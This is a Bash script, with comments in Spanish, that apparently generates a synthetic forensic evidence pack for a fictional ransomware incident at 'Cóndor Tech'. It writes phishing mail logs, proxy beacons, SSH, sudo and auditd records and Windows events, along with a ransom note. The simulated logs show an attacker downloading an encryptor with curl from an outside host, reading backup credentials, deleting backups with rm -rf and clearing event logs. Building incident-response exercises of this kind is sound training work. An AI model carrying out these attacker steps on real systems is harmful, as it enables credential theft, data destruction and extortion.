#!/bin/bash
# Genera el pack de evidencias de Cóndor Tech (determinista). Noche del 13 al 14 de octubre de 2026.
E=/srv/evidencias; mkdir -p $E; rm -f $E/*
# ---------- correo (SRV-CORREO) ----------
cat > $E/mail.log <<'M'
Oct 13 16:11:48 srv-correo postfix/smtpd[2211]: connect from mail-out.condor-tech-helpdesk.com[198.51.100.77]
Oct 13 16:11:49 srv-correo postfix/smtpd[2211]: 8A1F3: client=mail-out.condor-tech-helpdesk.com[198.51.100.77], from=<soporte@condor-tech-helpdesk.com>, subject="Actualizacion obligatoria de credenciales ERP - vence hoy"
Oct 13 16:11:49 srv-correo postfix/qmgr[1190]: 8A1F3: to=<mrojas@condortech.com.uy>, status=sent (delivered to mailbox)
Oct 13 16:11:49 srv-correo postfix/qmgr[1190]: 8A1F3: to=<lgarcia@condortech.com.uy>, status=sent (delivered to mailbox)
Oct 13 16:11:49 srv-correo postfix/qmgr[1190]: 8A1F3: to=<pfernandez@condortech.com.uy>, status=sent (delivered to mailbox)
Oct 13 16:11:49 srv-correo postfix/qmgr[1190]: 8A1F3: to=<dmartinez@condortech.com.uy>, status=sent (delivered to mailbox)
Oct 13 16:12:30 srv-correo amavis[3301]: 8A1F3: SPF=fail DKIM=none DMARC=none; action=TAG (phishing score 6.1, threshold 7.0 - delivered)
Oct 13 16:19:02 srv-correo postfix/smtpd[2219]: connect from mx.proveedor-nube.com[203.0.113.9]
Oct 13 16:19:03 srv-correo postfix/qmgr[1190]: 8B2C0: from=<facturacion@proveedor-nube.com>, to=<cuentas@condortech.com.uy>, subject="Factura 2026-09 disponible", status=sent
Oct 13 17:02:11 srv-correo postfix/smtpd[2230]: 8C9D4: from=<lgarcia@condortech.com.uy>, to=<soporte@condortech.com.uy>, subject="Correo raro de credenciales ERP, es legitimo?", status=sent
Oct 13 17:05:40 srv-correo postfix/smtpd[2232]: 8CA10: from=<soporte@condortech.com.uy>, to=<lgarcia@condortech.com.uy>, subject="RE: Correo raro - NO lo abras, es phishing", status=sent
M
# ---------- proxy de salida (SRV-PROXY, squid) ----------
{
printf '1791919205.112    118 10.10.30.17 TCP_MISS/200 2130 GET http://condor-tech-helpdesk.com/erp/login.php - HIER_DIRECT/198.51.100.77 text/html\n'
printf '1791919219.004    402 10.10.30.17 TCP_MISS/200 884 POST http://condor-tech-helpdesk.com/erp/login.php - HIER_DIRECT/198.51.100.77 text/html\n'
printf '1791919233.551    211 10.10.30.17 TCP_MISS/200 71234 GET http://condor-tech-helpdesk.com/erp/ERP_Update_v2.exe - HIER_DIRECT/198.51.100.77 application/octet-stream\n'
printf '1791919264.020     93 10.10.30.03 TCP_MISS/200 5120 GET http://noticias.uy/ - HIER_DIRECT/179.27.100.2 text/html\n'
# beacon: WS-CONTA-07 -> 203.0.113.66:443 cada 5 min desde 16:23 hasta 05:45
t=1791919380
while [ $t -le 1791967500 ]; do
  printf '%d.%03d    305 10.10.30.17 TCP_TUNNEL/200 1842 CONNECT 203.0.113.66:443 - HIER_DIRECT/203.0.113.66 -\n' $t $((RANDOM%900))
  t=$((t+300))
done
printf '1791920100.771    80 10.10.30.12 TCP_MISS/200 3310 GET http://apt.ubuntu.com/ubuntu/dists/jammy/InRelease - HIER_DIRECT/91.189.91.39 text/plain\n'
printf '1791921900.212    76 10.10.30.03 TCP_MISS/200 9821 GET http://condortech.com.uy/intranet/ - HIER_DIRECT/10.10.20.9 text/html\n'
printf '1791928200.003    91 10.10.20.5 TCP_MISS/200 2290 GET http://security.ubuntu.com/ubuntu/dists/jammy-security/InRelease - HIER_DIRECT/91.189.91.81 text/plain\n'
printf '1791951600.918    64 10.10.30.12 TCP_MISS/200 1200 GET http://ocsp.digicert.com/ - HIER_DIRECT/198.51.100.23 application/ocsp-response\n'
printf '1791966720.117   1210 10.10.20.7 TCP_TUNNEL/200 51200 CONNECT 203.0.113.66:443 - HIER_DIRECT/203.0.113.66 -\n'
} | sort -n > $E/proxy-access.log
# ---------- auth.log del servidor ERP (SRV-ERP 10.10.20.5) ----------
cat > $E/srv-erp-auth.log <<'A'
Oct 13 15:58:02 srv-erp sshd[4102]: Accepted publickey for dmartinez from 10.10.30.21 port 50210 ssh2: RSA SHA256:qK9c...
Oct 13 15:58:02 srv-erp sshd[4102]: pam_unix(sshd:session): session opened for user dmartinez by (uid=0)
Oct 13 16:31:44 srv-erp sshd[4190]: Failed password for lgarcia from 10.10.30.3 port 50388 ssh2
Oct 13 16:31:50 srv-erp sshd[4190]: Accepted password for lgarcia from 10.10.30.3 port 50388 ssh2
Oct 13 16:31:50 srv-erp sshd[4190]: pam_unix(sshd:session): session opened for user lgarcia by (uid=0)
Oct 13 16:40:12 srv-erp sshd[4190]: pam_unix(sshd:session): session closed for user lgarcia
Oct 13 17:05:31 srv-erp sshd[4233]: Accepted password for mrojas from 10.10.30.17 port 51007 ssh2
Oct 13 17:05:31 srv-erp sshd[4233]: pam_unix(sshd:session): session opened for user mrojas by (uid=0)
Oct 13 17:06:02 srv-erp sudo: mrojas : command not allowed ; TTY=pts/1 ; PWD=/home/mrojas ; USER=root ; COMMAND=/bin/bash
Oct 13 17:06:40 srv-erp sudo: mrojas : TTY=pts/1 ; PWD=/home/mrojas ; USER=root ; COMMAND=/usr/bin/systemctl status restic-backup.timer
Oct 13 17:07:15 srv-erp sudo: mrojas : TTY=pts/1 ; PWD=/home/mrojas ; USER=root ; COMMAND=/usr/bin/cat /etc/restic/env
Oct 13 17:07:15 srv-erp sudo: pam_unix(sudo:session): session opened for user root by mrojas(uid=1001)
Oct 13 17:08:03 srv-erp sshd[4233]: pam_unix(sshd:session): session closed for user mrojas
Oct 13 22:10:09 srv-erp CRON[5110]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 13 22:10:12 srv-erp CRON[5110]: pam_unix(cron:session): session closed for user root
Oct 14 02:14:50 srv-erp sshd[5380]: Failed password for root from 192.0.2.44 port 44121 ssh2
Oct 14 02:14:53 srv-erp sshd[5380]: Failed password for root from 192.0.2.44 port 44121 ssh2
Oct 14 02:14:55 srv-erp sshd[5380]: Connection closed by authenticating user root 192.0.2.44 port 44121 [preauth]
Oct 14 05:28:17 srv-erp sshd[5602]: Accepted password for mrojas from 10.10.30.17 port 51990 ssh2
Oct 14 05:28:17 srv-erp sshd[5602]: pam_unix(sshd:session): session opened for user mrojas by (uid=0)
Oct 14 05:29:40 srv-erp sudo: mrojas : TTY=pts/0 ; PWD=/srv/erp ; USER=root ; COMMAND=/bin/rm -rf /srv/respaldo-local/erp
Oct 14 05:29:40 srv-erp sudo: pam_unix(sudo:session): session opened for user root by mrojas(uid=1001)
Oct 14 05:30:05 srv-erp sudo: mrojas : TTY=pts/0 ; PWD=/srv/erp ; USER=root ; COMMAND=/tmp/.x/cifrador /srv/erp
Oct 14 05:46:58 srv-erp sshd[5602]: pam_unix(sshd:session): session closed for user mrojas
A
# ---------- auditd del servidor ERP ----------
cat > $E/srv-erp-audit.log <<'U'
type=USER_LOGIN msg=audit(1791921931.410:9001): pid=4233 uid=0 auid=1001 ses=12 msg='op=login id=1001 exe="/usr/sbin/sshd" hostname=10.10.30.17 addr=10.10.30.17 terminal=ssh res=success'
type=SYSCALL msg=audit(1791922035.101:9044): arch=c000003e syscall=59 success=yes exit=0 a0=... ppid=4301 pid=4310 auid=1001 uid=0 gid=0 euid=0 ses=12 comm="cat" exe="/usr/bin/cat" key="privilegiado"
type=EXECVE msg=audit(1791922035.101:9044): argc=2 a0="cat" a1="/etc/restic/env"
type=SYSCALL msg=audit(1791922080.550:9052): arch=c000003e syscall=59 success=yes exit=0 ppid=4301 pid=4322 auid=1001 uid=1001 gid=1001 euid=1001 ses=12 comm="curl" exe="/usr/bin/curl" key="propia"
type=EXECVE msg=audit(1791922080.550:9052): argc=4 a0="curl" a1="-s" a2="https://203.0.113.66/api/k" a3="-o/tmp/.x/cifrador"
type=USER_LOGIN msg=audit(1791966497.220:9801): pid=5602 uid=0 auid=1001 ses=31 msg='op=login id=1001 exe="/usr/sbin/sshd" hostname=10.10.30.17 addr=10.10.30.17 terminal=ssh res=success'
type=SYSCALL msg=audit(1791966580.004:9820): arch=c000003e syscall=59 success=yes exit=0 ppid=5640 pid=5651 auid=1001 uid=0 gid=0 euid=0 ses=31 comm="rm" exe="/usr/bin/rm" key="privilegiado"
type=EXECVE msg=audit(1791966580.004:9820): argc=3 a0="rm" a1="-rf" a2="/srv/respaldo-local/erp"
type=SYSCALL msg=audit(1791966605.330:9831): arch=c000003e syscall=59 success=yes exit=0 ppid=5640 pid=5670 auid=1001 uid=0 gid=0 euid=0 ses=31 comm="cifrador" exe="/tmp/.x/cifrador" key="privilegiado"
type=EXECVE msg=audit(1791966605.330:9831): argc=2 a0="/tmp/.x/cifrador" a1="/srv/erp"
type=PATH msg=audit(1791966606.112:9832): item=0 name="/srv/erp/LEEME_RECUPERAR.txt" inode=262401 dev=08:01 mode=0100644 ouid=0 ogid=0 nametype=CREATE
U
# ---------- aplicación ERP ----------
cat > $E/erp-app.log <<'P'
2026-10-13 18:00:01 INFO  backup-local ok: /srv/respaldo-local/erp (7 archivos)
2026-10-13 22:10:10 INFO  backup-local ok: /srv/respaldo-local/erp (7 archivos)
2026-10-14 02:10:10 INFO  backup-local ok: /srv/respaldo-local/erp (7 archivos)
2026-10-14 05:30:41 ERROR facturas-2026-09.csv: formato invalido (encabezado ilegible)
2026-10-14 05:30:41 ERROR clientes.csv: formato invalido (encabezado ilegible)
2026-10-14 05:31:02 ERROR no se puede abrir erp.conf: archivo no encontrado
2026-10-14 05:47:12 FATAL ERP detenido: 7 archivos inaccesibles. Ver /srv/erp
P
# ---------- Windows SRV-ARCHIVOS (exportación JSON de evtx_dump) ----------
cat > $E/SRV-ARCHIVOS-Security.evtx.json <<'W'
{"Event":{"System":{"Computer":"SRV-ARCHIVOS.condortech.local","EventID":4624,"TimeCreated":{"#attributes":{"SystemTime":"2026-10-13T21:02:14Z"}}},"EventData":{"TargetUserName":"mrojas","TargetDomainName":"CONDORTECH","LogonType":3,"IpAddress":"10.10.30.17","WorkstationName":"WS-CONTA-07"}}}
{"Event":{"System":{"Computer":"SRV-ARCHIVOS.condortech.local","EventID":4624,"TimeCreated":{"#attributes":{"SystemTime":"2026-10-13T21:15:40Z"}}},"EventData":{"TargetUserName":"pfernandez","TargetDomainName":"CONDORTECH","LogonType":3,"IpAddress":"10.10.30.22","WorkstationName":"WS-VENTAS-12"}}}
{"Event":{"System":{"Computer":"SRV-ARCHIVOS.condortech.local","EventID":4672,"TimeCreated":{"#attributes":{"SystemTime":"2026-10-13T21:02:14Z"}}},"EventData":{"SubjectUserName":"mrojas","PrivilegeList":"SeBackupPrivilege SeRestorePrivilege"}}}
{"Event":{"System":{"Computer":"SRV-ARCHIVOS.condortech.local","EventID":4688,"TimeCreated":{"#attributes":{"SystemTime":"2026-10-14T08:31:55Z"}}},"EventData":{"SubjectUserName":"mrojas","NewProcessName":"C:\\Users\\mrojas\\AppData\\Local\\Temp\\ERP_Update_v2.exe","ParentProcessName":"C:\\Windows\\explorer.exe","CommandLine":"ERP_Update_v2.exe --quiet \\\\SRV-ARCHIVOS\\compartido"}}}
{"Event":{"System":{"Computer":"SRV-ARCHIVOS.condortech.local","EventID":5156,"TimeCreated":{"#attributes":{"SystemTime":"2026-10-14T08:32:01Z"}}},"EventData":{"Application":"\\device\\harddiskvolume2\\users\\mrojas\\appdata\\local\\temp\\erp_update_v2.exe","Direction":"%%14593","SourceAddress":"10.10.20.7","DestAddress":"203.0.113.66","DestPort":"443","Protocol":6}}}
{"Event":{"System":{"Computer":"SRV-ARCHIVOS.condortech.local","EventID":4663,"TimeCreated":{"#attributes":{"SystemTime":"2026-10-14T08:33:10Z"}}},"EventData":{"SubjectUserName":"mrojas","ObjectName":"\\\\SRV-ARCHIVOS\\compartido\\contabilidad\\clientes.xlsx","AccessMask":"0x2","ProcessName":"C:\\Users\\mrojas\\AppData\\Local\\Temp\\ERP_Update_v2.exe"}}}
{"Event":{"System":{"Computer":"SRV-ARCHIVOS.condortech.local","EventID":4663,"TimeCreated":{"#attributes":{"SystemTime":"2026-10-14T08:33:11Z"}}},"EventData":{"SubjectUserName":"mrojas","ObjectName":"\\\\SRV-ARCHIVOS\\compartido\\contabilidad\\LEEME_RECUPERAR.txt","AccessMask":"0x2","ProcessName":"C:\\Users\\mrojas\\AppData\\Local\\Temp\\ERP_Update_v2.exe"}}}
{"Event":{"System":{"Computer":"SRV-ARCHIVOS.condortech.local","EventID":1102,"TimeCreated":{"#attributes":{"SystemTime":"2026-10-14T08:44:20Z"}}},"EventData":{"SubjectUserName":"mrojas","SubjectDomainName":"CONDORTECH"}}}
W
# ---------- la carpeta del ERP «cifrada» (nombres reales + nota) ----------
mkdir -p /srv/erp; rm -f /srv/erp/*
for f in clientes.csv facturas-2026-07.csv facturas-2026-08.csv facturas-2026-09.csv contrato-ERP-rto.txt contrato-nube-rpo.txt erp.conf; do
  head -c $((1500 + RANDOM % 2000)) /dev/urandom > "/srv/erp/$f.condor"
done
cat > /srv/erp/LEEME_RECUPERAR.txt <<'R'
=== TUS ARCHIVOS FUERON CIFRADOS ===
Todos los documentos del ERP de Condor Tech estan cifrados con AES-256.
Tus copias locales tambien. No pierdas el tiempo con "herramientas de recuperacion".
Para recuperar: 1.8 BTC a la direccion bc1q7v...k9x antes de 48 horas. Despues, el precio se duplica
y publicamos los contratos de tus clientes.
Contacto: condor-recover@onionmail.test  ID: CT-4471-ERP
R
touch -d "2026-10-14 05:47:12" /srv/erp/*
echo "evidencias ok"
